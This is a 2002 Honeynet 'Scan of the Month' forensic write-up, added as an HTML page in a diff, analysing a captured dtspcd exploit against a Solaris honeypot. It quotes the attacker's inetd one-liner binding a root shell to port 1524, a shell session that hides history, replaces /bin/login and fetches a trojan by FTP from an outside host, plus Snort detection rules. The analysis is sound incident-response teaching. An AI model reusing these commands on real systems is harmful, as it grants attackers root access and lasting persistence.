@@ -1,0 +1,249 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head>
+    <title>Scan of the Month 20</title></head>
+
+  <body>
+    <center>
+      <h1>Scan of the Month 20</h1>
+      <h2>A Solaris challenge ... :)</h2>
+    </center>
+
+
+    <h2>1. The Challenge</h2> 
+    On 08 January, 2002 a default, unpatched installation of Solaris8 Sparc
+was remotely compromised with the dtspcd exploit. What makes this attack
+interesting is that this is the first time the attack was identified and
+captured in the wild, resulting a CERT advisory. Using the Snort binary capture
+of the attack, answer the following questions. The honeypot that is attacked
+is 172.16.1.102.       <h2>2. Tools and Links</h2>
+    Analysis tools I used, and where to get them:
+    <ul>
+      <li>snort 1.8 from <a href="http://www.snort.org/">http://www.snort.org/</a></li>
+      <li>etherreal 0.9.3 from <a href="http://www.ethereal.com/">http://www.ethereal.com/</a></li>
+      <li><a href="http://www.google.com/">http://www.google.com/</a> :-)</li>
+    </ul>
+    <h2>3. The Analysis</h2>
+    <h3>3.0 Starting Point</h3>
+    First I downloaded the snort capture and verified the md5sum:
+    <pre>linux:~ &gt; wget http://project.honeynet.org/scans/scan20/0108@000-snort.log.tar.gz &gt;/dev/null 2&gt;&amp;1
+linux:~ &gt; md5sum 0108\@000-snort.log.tar.gz
+612be364f54ca5fcb47cf70e69419175  0108@000-snort.log.tar.gz</pre><br> 
+Afterwards I tried to get an overview over the capture: I ran snort (/usr/local/bin/snort
+-r 0108\@000-snort.log -c ./snort.conf) which produced 4 interesting alerts:
+EXPERIMENTAL CDE dtspcd exploit attempt:  <pre>alert tcp $EXTERNAL_NET any -&gt; $HOME_NET 6112 (msg:"EXPERIMENTAL CDE dtspcd exploit attempt"; flags:A+;
+ content:"1"; offset:10; depth:1; content:!"000"; offset:11; depth:3; reference:cve,CAN-2001-0803; 
+ reference:url, www.cert.org/advisories/CA-2002-01.html; classtype:misc-attack; sid:1398; rev:3;)</pre><br> 
+Now I looked at the capture with ethereal, following one of the tcp streams
+mentioned by snort and found the following (look at 3.3 for more about this): 
+<pre>/bin/ksh -c echo "ingreslock stream tcp nowait root /bin/sh sh -i"&gt;/tmp/x;/usr/sbin/inetd -s /tmp/x;sleep 10;/bin/rm -f /tmp/x</pre><br> 
+While looking through the other relevant connections I could recover a shell
+session which took place on the newly opened port 1524/tcp: <pre>uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
+# SunOS buzzy 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
+/core: No such file or directory
+/var/dt/tmp/DTSPCD.log: No such file or directory
+BD PID(s): 3476
+# w
+  8:47am  up 11:24,  0 users,  load average: 0.12, 0.04, 0.02
+User     tty           login@  idle   JCPU   PCPU  what
+# unset HISTFILE
+# cd /tmp
+mkdir /usr/lib
+# mkdir: Failed to make directory "/usr/lib"; File exists
+# mv /bin/login /usr/lib/libfl.k
+# ftp 64.224.118.115
+ftp
+ftp: ioctl(TIOCGETP): Invalid argument
+Password:a@
+
+cd pub
+binary
+get sun1
+bye
+Name (64.224.118.115:root): # 
+# ls
+ps_data
+sun1
+# chmod 555 sun1
+# mv sun1 /bin/login
+#</pre><br> 
+As you can see the intruder downloaded something which is named 'sun1'. So
+I used ethereal to recover this file from the capture: <pre>linux:~ &gt; l sun1
+-rw-r--r--    1 user  users       89776 Apr  4 15:13 sun1
+linux:~ &gt; md5sum sun1
+c7c4d0f28b7e1ae9fc6223e7926df916  sun1</pre>
+
+    <h3>3.1 Question 1</h3>
+    <i>What is a NOP slide, and how is this one different from the NOP slide in the rpc.statd exploit in Scan10?</i><br><br> 
+    A NOP slide is a more or less large amount of instructions which perform
+a null operation (NOP = No OPeration) on the cpu. NOP slides are normally
+used in front of shellcode (read <a href="http://www.phrack.com/show.php?p=49&amp;a=14">Phrack 49 article 14</a> by aleph1 for more information on shellcode and why to use NOP instructions).<br> 
+     The difference between the NOP slides is that this one consists of no
+real 'NOP' instruction; it's a xor instruction (built from 4 bytes):    
+ <pre>0x80 0x1c 0x40 0x11   /* xor %l1,%l1,%g0 */</pre>
+     The NOP slide from Scan 10 is built from one byte which is a real i386 NOP instruction: 0x90<br>
+
+    <h3>3.2 Question 2</h3>
+    <i>The attack was on 08 Jan, 2002. Would Snort have generated an alert then for the attack?</i><br><br>
+    Yes, according to the <a href="http://cvs.sourceforge.net/cgi-bin/viewcvs.cgi/snort/snort/">snort cvs repository</a> the shellcode.rules file has a 'SHELLCODE sparc NOOP' rule since about 11 months:
+<pre>alert ip $EXTERNAL_NET any -&gt; $HOME_NET any (msg:"SHELLCODE sparc NOOP"; 
+ content:"|801c 4011 801c 4011 801c 4011 801c 4011|"; reference:arachnids,353; 
+ classtype:shellcode-detect; sid:645; rev:2;)</pre><br>
+    This matches exactly the NOP slide used by our intruder.
+
+    <h3>3.3 Question 3</h3>
+    <i>In the exploit code, the command "/bin/sh sh -i" is given, what is its purpose, and why is 'sh' shown twice?</i><br><br> 
+    The '/bin/ksh -c echo "ingreslock stream tcp nowait root /bin/sh sh -i"&gt;/tmp/x'
+command has the purpose to create a new minimal inetd.conf which is afterwards
+used to start a new inetd ('/usr/sbin/inetd -s /tmp/x').<br>
+    The purpose of the inetd.conf line is to bind an interactive root shell ('sh -i') to port 1524/tcp (ingreslock).<br>
+    Each inetd.conf file contains one line for each service:
+    <pre>service-name endpoint-type protocol wait-status uid server-program server-arguments</pre> 
+    If a server-program requires an argument you have to provide the entire
+command line including argument 0 (the name of your server program) within
+the last field. This is why 'sh' ist shown twice: first the server-program
+'/bin/sh' and afterwards the server-arguments 'sh -i'.<br>
+
+    <h3>3.4 Question 4</h3>
+    <i>The
+attacker executed a variety of commands on the hacked Solaris box. Which
+commands were automated by the exploit, which commands were manual by the
+attacker himself?</i><br><br>
+    To answer this question I took ethereal and assembled a timeline of the attack:
+    <table border="1"><tbody><tr><th>packet no</th><th>time since last<br> noted packet</th><th>description</th></tr>
+    <tr><td>526</td><td>-</td><td>first connection to dtspcd (SYN)</td></tr>
+    <tr><td>537</td><td>&lt;0.5s</td><td>connection closed</td></tr>
+    <tr><td>538</td><td>10.3s</td><td>connection attempt to ingreslock (SYN)</td></tr>
+    <tr><td>539</td><td>0.001s</td><td>connection rejected (RST, ACK)</td></tr>
+    <tr><td>540</td><td>0.09s</td><td>second connection to dtspcd (SYN)</td></tr>
+    <tr><td>543</td><td>0.2s</td><td>exploit is transferred</td></tr>
+    <tr><td>551</td><td>0.2s</td><td>connection closed</td></tr>
+    <tr><td>552</td><td>0.005s</td><td>third connection to dtspcd (SYN)</td></tr>
+    <tr><td>555</td><td>0.2s</td><td>exploit is transferred again</td></tr>
+    <tr><td>564</td><td>1s</td><td>connection closed</td></tr>
+    <tr><td>565</td><td>0.005s</td><td>fourth connection to dtspcd (SYN)</td></tr>
+    <tr><td>568</td><td>0.2s</td><td>exploit is transferred again</td></tr>
+    <tr><td>577</td><td>0.8s</td><td>connection closed</td></tr>
+    <tr><td>578</td><td>0.005s</td><td>fifth connection to dtspcd (SYN)</td></tr>
+    <tr><td>581</td><td>0.15s</td><td>exploit is transferred again</td></tr>
+    <tr><td>588</td><td>11s</td><td>connection closed</td></tr>
+    <tr><td>589</td><td>0.02s</td><td>connection to ingreslock (SYN)</td></tr>
+    <tr><td>593</td><td>0.15s</td><td>long command to shell session ('uname -a; ls...')</td></tr>
+    <tr><td>606</td><td>3.7s</td><td>'w' command to shell session</td></tr>
+    <tr><td>612</td><td>27s</td><td>'unset HISTFILE' command to shell session</td></tr>
+    <tr><td>614</td><td>0.08s</td><td>'cd /tmp\nmkdir /usr/lib' command to shell session</td></tr>
+    <tr><td>619</td><td>0.5s</td><td>'mv /bin/login /usr/lib/libfl.k' command to shell session</td></tr>
+    <tr><td>622</td><td>9.2s</td><td>'ftp 64.224.118.115' command to shell session</td></tr>
+    <tr><td>629</td><td>4.3s</td><td>'ftp' (login to ftp server)</td></tr>
+    <tr><td>641</td><td>5.9s</td><td>'a@' (password to ftp server)</td></tr>
+    <tr><td>648</td><td>2.6s</td><td>'cd pub' (to ftp server)</td></tr>
+    <tr><td colspan="3">stopped here with timeline reassembling</td></tr>
+    </tbody></table><br> 
+    After looking several minutes on this table I concluded the following:
+The connection to the shell and the first command line was sent from the
+exploit-script automatically (up to and including packet 593). Afterwards
+all commands where manually given via some interface (they have a more or
+less long delay).<br>
+    What doesn't fit to this statement are the packets 612,614,619:<br>
+    The time between is very short (0.08s,0.5s) and packet 614 includes 2 commands which are separated by 0x0a (\n).
+    From my point of view they were copied to the interface via copy&amp;paste from some kind of document.<br>
+
+
+    <h3>3.5 Question 5</h3>
+    <i>What is sun1, and how does it work?</i><br><br>
+    I reassembled 'sun1' during 3.0, so we can take a closer look at it now:
+    <pre>linux:~ &gt; file sun1
+sun1: ELF 32-bit MSB executable, SPARC, version 1, statically linked, stripped
+linux:~ &gt; strings sun1|less</pre>
+    interesting strings I found:
+<pre> -snip-
+/usr/lib/libfl.k
+/bin/sh
+/bin/ksh
+ -snap-</pre><br>
+
+    Afterwards I tried to load it into gdb 5.0 on a sparc solaris 8:
+<pre>sun:~ &gt; gdb sun1
+GNU gdb 5.0
+Copyright 2000 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "sparc-sun-solaris2.8"..."~/sun1": not in executable format: File truncated</pre><br>
+
+    Hmmm? what happened?<br>
+    After looking again into ethereal I found the ftp server telling:
+<pre>150 Opening BINARY mode data connection for sun1 (90544 bytes)</pre><br> 
+    But as you can see in 3.0 we only have 89776 bytes saved from the capture?
+After looking again on the ftp-data connection I noticed that the end of
+the ftp transfer is missing (no FIN or RST packets). Something lost a few
+packets. I can't tell what, because we don't know how big 'sun1' is on the
+hacked box.<br> 
+    Because of possible legal issues I didn't try to fetch the sun1 binary
+again from the server, so I have to get to some conclusions with what I know:<br>
+
+    <ul>
+      <li>'sun1' is a solaris sparc executable;
+      </li><li>it contains the exact location where our intruder stored the original '/bin/login' (see shell transcript in 3.0)
+      </li><li>it is moved to '/bin/login' (see again 3.0)
+      </li><li>I wasn't able to find anything useful about 'sun1' or '/usr/lib/libfl.k' on google;
+    </li></ul>
+
+    Now, as I do not have more facts I assume the following:<br> 
+    'sun1' is a wrapper for the original '/bin/login' that's for sure I think.
+There are two possibilities what's the purpose behind that: 1) a backdoor
+or 2) a keystroke logger. As I found the reference to '/bin/sh' and '/bin/ksh'
+some times in this binary I'll think it's a backdoor. As to the truncated
+binary I'm not able to tell how it works.      <h3>3.6 Question 6</h3>
+    <i>What did you learn from this exercise?</i><br><br>
+    a lot of things :-)
+    <ul>
+       <li>what a NOP slide is;
+       </li><li>the exact format of the inetd.conf file (specifically concerning the last 2 fields);
+       </li><li>a few things about german legislation, because I talked to our lawyer about downloading 'sun1'
+    </li></ul>
+
+    <h3>3.7 Question 7</h3>
+    <i>How long did this challenge take you?</i><br><br>
+
+    let's look how long each section took: 
+    <ul>
+       <li>3.0: 1 hour
+       </li><li>3.1: 3 hours (I had to do a lot of reading)
+       </li><li>3.2: 10 minutes
+       </li><li>3.3: 10 minutes
+       </li><li>3.4: 1.5 hours (mainly building the timetable)
+       </li><li>3.5: 1 hour
+       </li><li>3.6: 5 minutes
+       </li><li>3.7: 5 minutes :-)
+       </li><li>3.8: 10 minutes
+    </li></ul> 
+    Ok, that are about 7.5 hours for answering the questions + 2 hours for
+writing, and proof reading. So I needed about 9.5 hours.<br><br>
+
+    <h3>3.8 Bonus Question</h3>
+    <i>One of the commands executed during the attack is</i>
+    <pre>echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`</pre>
+    <i>What is the purpose of this command and what does 'BD' stand for?</i><br><br> 
+     The purpose of this command is to print out the process ids of all running
+programs which where started with the command line argument ' -s /tmp/x'.
+The intruder primarily looks for the PID(s) of the inetd which was started
+by his exploit (look at 3.3).<br>
+    I think 'BD' stands for 'BackDoor' because this inetd binds an interactive root shell to port 1524/tcp.<br>
+
+    <h3>3.9 Note</h3>
+    While looking through the timetable in 3.4 I've noticed another thing:<br>
+    Look at the packets 538+539: Why is there a connection attempt to 1524/tcp <b>prior</b> to the first exploit?<br> 
+    Maybe the tool of our attacker is clever enough to first look for an
+unused and unfiltered port before trying to bind a shell to this port?<br>
+    Or is it only a bug within the exploit code?<br><br>
+    Maybe someone out there knows the answer, please drop me a line...<br><br>
+
+
+    <h2>4. Contact</h2>
+      This analysis was written by Roland von Herget.
+      You may reach me via <a href="mailto:rherget@xebec.de">rherget@xebec.de</a>
+<br><hr>
+<!-- hhmts start -->
+Last modified: Fri Apr 26 10:53:18 CEST 2002
+<!-- hhmts end -->
+  </body></html>
